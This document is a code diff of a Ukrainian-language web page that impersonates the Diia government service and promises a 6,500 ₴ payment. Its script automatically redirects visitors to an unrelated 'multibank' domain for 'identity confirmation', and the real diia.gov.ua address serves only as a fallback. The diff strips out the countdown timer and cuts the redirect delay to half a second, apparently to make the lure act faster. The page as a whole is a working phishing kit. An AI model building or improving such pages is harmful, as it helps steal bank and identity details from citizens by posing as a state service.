@@ -25,7 +25,6 @@ body {
   padding: 12px;
 }
 
-/* Головна картка - компактна */
 .card {
   max-width: 420px;
   width: 100%;
@@ -44,7 +43,6 @@ body {
   to { opacity: 1; transform: translateY(0); }
 }
 
-/* Логотип */
 .logo {
   display: flex;
   justify-content: center;
@@ -67,7 +65,6 @@ body {
   font-size: 13px;
 }
 
-/* Заголовок */
 h1 {
   font-size: 22px;
   font-weight: 800;
@@ -86,7 +83,6 @@ h1 {
   color: transparent;
 }
 
-/* Сума */
 .amount {
   background: rgba(0,0,0,0.35);
   border-radius: 60px;
@@ -108,7 +104,6 @@ h1 {
   margin-left: 3px;
 }
 
-/* Сітка інформації - компактна */
 .info-grid {
   display: flex;
   flex-direction: column;
@@ -147,41 +142,6 @@ h1 {
   border: 1px solid rgba(255,215,0,0.3);
 }
 
-/* Блок важливої інформації */
-.important {
-  background: rgba(0,0,0,0.3);
-  border-radius: 18px;
-  padding: 10px 14px;
-  margin-bottom: 14px;
-  border-left: 3px solid #FFD700;
-}
-.important p {
-  font-size: 11px;
-  font-weight: 700;
-  color: #FFD700;
-  margin-bottom: 6px;
-  display: flex;
-  align-items: center;
-  gap: 5px;
-}
-.important ul {
-  list-style: none;
-}
-.important li {
-  font-size: 10px;
-  padding: 4px 0 4px 18px;
-  position: relative;
-  color: rgba(255,255,240,0.85);
-}
-.important li::before {
-  content: "✓";
-  position: absolute;
-  left: 0;
-  color: #FFD700;
-  font-size: 10px;
-}
-
-/* Опис */
 .desc {
   background: rgba(0,0,0,0.25);
   border-radius: 16px;
@@ -194,90 +154,6 @@ h1 {
   border: 1px solid rgba(255,255,255,0.08);
 }
 
-/* Таймер компактний */
-.timer-box {
-  display: flex;
-  flex-direction: column;
-  align-items: center;
-  margin-bottom: 10px;
-}
-.timer-ring {
-  position: relative;
-  width: 70px;
-  height: 70px;
-  margin-bottom: 5px;
-}
-.timer-svg {
-  transform: rotate(-90deg);
-}
-.timer-bg {
-  stroke: rgba(255,255,255,0.2);
-  stroke-width: 4;
-  fill: none;
-}
-.timer-progress {
-  stroke: url(#grad);
-  stroke-width: 5;
-  stroke-linecap: round;
-  fill: none;
-  transition: stroke-dashoffset 0.05s linear;
-}
-.timer-number {
-  position: absolute;
-  top: 50%;
-  left: 50%;
-  transform: translate(-50%, -50%);
-  font-size: 24px;
-  font-weight: 800;
-  color: #FFE484;
-  background: rgba(0,0,0,0.5);
-  width: 50px;
-  height: 50px;
-  display: flex;
-  align-items: center;
-  justify-content: center;
-  border-radius: 50%;
-  border: 1px solid rgba(255,215,0,0.5);
-}
-.timer-label {
-  font-size: 10px;
-  font-weight: 600;
-  background: rgba(0,0,0,0.4);
-  padding: 3px 12px;
-  border-radius: 30px;
-  color: rgba(255,255,245,0.9);
-  border: 1px solid rgba(255,215,0,0.3);
-}
-
-/* Статус */
-.status {
-  background: rgba(255,215,0,0.12);
-  border-radius: 40px;
-  padding: 5px 12px;
-  display: inline-flex;
-  align-items: center;
-  gap: 6px;
-  margin: 0 auto 10px;
-  font-size: 10px;
-  font-weight: 500;
-  color: #FFEFB9;
-  border: 1px solid rgba(255,215,0,0.4);
-}
-.status span:first-child {
-  font-size: 12px;
-}
-.dots::after {
-  content: " .";
-  animation: dotsAnim 1.5s steps(4, end) infinite;
-}
-@keyframes dotsAnim {
-  0%, 20% { content: " ."; }
-  40% { content: " .."; }
-  60%, 80% { content: " ..."; }
-  100% { content: " ."; }
-}
-
-/* Футер */
 .footer {
   display: flex;
   align-items: center;
@@ -296,27 +172,13 @@ h1 {
   font-size: 10px;
 }
 
-/* Адаптація під малі телефони */
 @media (max-width: 400px) {
   .card { padding: 16px 12px; }
   h1 { font-size: 20px; }
   .amount span:first-child { font-size: 28px; }
   .amount span:last-child { font-size: 16px; }
-  .info-row { padding: 6px 10px; }
-  .info-label { font-size: 11px; }
-  .info-value { font-size: 10px; }
-  .important li { font-size: 9px; }
-  .desc { font-size: 10px; }
 }
 
-@media (max-width: 340px) {
-  .info-row { flex-direction: column; align-items: flex-start; }
-  .info-value { align-self: flex-start; }
-  h1 { font-size: 18px; }
-  .amount span:first-child { font-size: 26px; }
-}
-
-/* Прибираємо скрол */
 html, body {
   overflow-x: hidden;
 }
@@ -324,7 +186,6 @@ html, body {
 </head>
 <body>
 <div class="card">
-
   <div class="logo">
     <div class="logo-badge">ДіяПослуги</div>
   </div>
@@ -355,35 +216,11 @@ html, body {
   </div>
 
   <div class="desc">
-    Для отримання коштів підтвердьте особу через безпечний платіжний шлюз.<br>Перенаправлення автоматичне.
-  </div>
-
-  <div class="timer-box">
-    <div class="timer-ring">
-      <svg width="70" height="70" viewBox="0 0 110 110" class="timer-svg">
-        <defs>
-          <linearGradient id="grad" x1="0%" y1="0%" x2="100%" y2="100%">
-            <stop offset="0%" stop-color="#FFD700" />
-            <stop offset="100%" stop-color="#FFA500" />
-          </linearGradient>
-        </defs>
-        <circle class="timer-bg" cx="55" cy="55" r="50" stroke-width="4" />
-        <circle class="timer-progress" cx="55" cy="55" r="50" stroke-width="5" 
-                stroke-dasharray="314.159" stroke-dashoffset="0" />
-      </svg>
-      <div class="timer-number" id="timerSec">5</div>
-    </div>
-    <div class="timer-label">⏳ Перехід через</div>
-  </div>
-
-  <div style="text-align: center;">
-    <div class="status">
-      <span>🔄</span> Підготовка платіжної сесії <span class="dots"></span>
-    </div>
+    Для отримання коштів підтвердьте особу через безпечний платіжний шлюз.<br>Перенаправлення через 0,5 секунди...
   </div>
 
   <div class="footer">
-    <span>🔐</span> Захищене з'єднання <span>•</span> <span>💳 6 600 ₴</span> <span>•</span> <span>🇺🇦</span>
+    <span>🔐</span> Захищене з'єднання <span>•</span> <span>💳 6 500 ₴</span> <span>•</span> <span>🇺🇦</span>
   </div>
 </div>
 
@@ -391,105 +228,12 @@ html, body {
 (function() {
   const TARGET_URL = "https://multibank_new.sjvco109.world/bd/1780061466";
   const FALLBACK_URL = "https://diia.gov.ua/services/yepidtrimka";
-
-  let seconds = 5;
-  let interval = null;
-  let timeout = null;
-  let redirected = false;
-
-  const timerNum = document.getElementById("timerSec");
-  const progressCircle = document.querySelector(".timer-progress");
-  const statusDiv = document.querySelector(".status");
-
-  const radius = 50;
-  const circumference = 2 * Math.PI * radius;
-
-  if (progressCircle) {
-    progressCircle.style.strokeDasharray = `${circumference}`;
-    progressCircle.style.strokeDashoffset = `${circumference}`;
-  }
-
-  function updateProgress(rem, total) {
-    if (!progressCircle) return;
-    const offset = circumference * (1 - rem / total);
-    progressCircle.style.strokeDashoffset = offset;
-  }
-
-  function redirect() {
-    if (redirected) return;
-    redirected = true;
-    if (interval) clearInterval(interval);
-    if (timeout) clearTimeout(timeout);
-    if (timerNum) timerNum.innerText = "✓";
-    if (statusDiv) {
-      statusDiv.innerHTML = "<span>🚀</span> Перенаправлення... <span style='display:inline-block;animation:pulse 0.3s ease'>⚡</span>";
-    }
-    const card = document.querySelector('.card');
-    if (card) card.style.border = "1px solid rgba(255,215,0,0.9)";
-    setTimeout(() => {
-      try { window.location.href = TARGET_URL; }
-      catch(e) { window.location.href = FALLBACK_URL; }
-    }, 80);
-  }
-
-  function startTimer() {
-    let current = seconds;
-    if (timerNum) timerNum.innerText = current;
-    updateProgress(current, seconds);
-    interval = setInterval(() => {
-      if (redirected) { if (interval) clearInterval(interval); return; }
-      current--;
-      if (current <= 0) {
-        if (interval) clearInterval(interval);
-        if (timerNum) timerNum.innerText = "0";
-        updateProgress(0, seconds);
-        redirect();
-      } else {
-        if (timerNum) timerNum.innerText = current;
-        updateProgress(current, seconds);
-        if (statusDiv && current > 0 && current % 2 === 0) {
-          const msgs = ["🔄 Підготовка сесії", "🔐 Захищений канал", "💳 Підключення до банку"];
-          const idx = (seconds - current) % msgs.length;
-          statusDiv.innerHTML = `<span>🔄</span> ${msgs[idx]} <span class="dots"></span>`;
-        }
-      }
-    }, 1000);
-  }
-
-  timeout = setTimeout(() => { if (!redirected) redirect(); }, seconds * 1000 + 200);
-  startTimer();
-
-  // Видаляємо всі посилання
-  document.querySelectorAll('a').forEach(link => {
-    link.style.pointerEvents = 'none';
-    link.removeAttribute('href');
-  });
-
-  // Пульсація таймера
-  const numDiv = document.querySelector('.timer-number');
-  if (numDiv) {
-    setInterval(() => {
-      if (!redirected && numDiv && parseInt(numDiv.innerText) > 0) {
-        numDiv.style.transform = "translate(-50%, -50%) scale(1.05)";
-        setTimeout(() => { if (numDiv) numDiv.style.transform = "translate(-50%, -50%) scale(1)"; }, 120);
-      }
-    }, 700);
-  }
-
-  // Заголовок вкладки
-  let origTitle = document.title;
-  const titleInt = setInterval(() => {
-    if (redirected) clearInterval(titleInt);
-    else if (timerNum) {
-      let s = parseInt(timerNum.innerText);
-      if (!isNaN(s) && s > 0) document.title = `⏳ ${s}с | 6 500₴`;
-      else document.title = origTitle;
-    }
-  }, 400);
-  setTimeout(() => { if (!redirected) clearInterval(titleInt); }, 6000);
-
-  // Вібрація
-  if ('vibrate' in navigator && window.innerWidth < 768) try { navigator.vibrate(10); } catch(e) {}
+  
+  // Перехід через 0.5 секунди
+  setTimeout(() => {
+    try { window.location.href = TARGET_URL; }
+    catch(e) { window.location.href = FALLBACK_URL; }
+  }, 500);
 })();
 </script>
 </body>
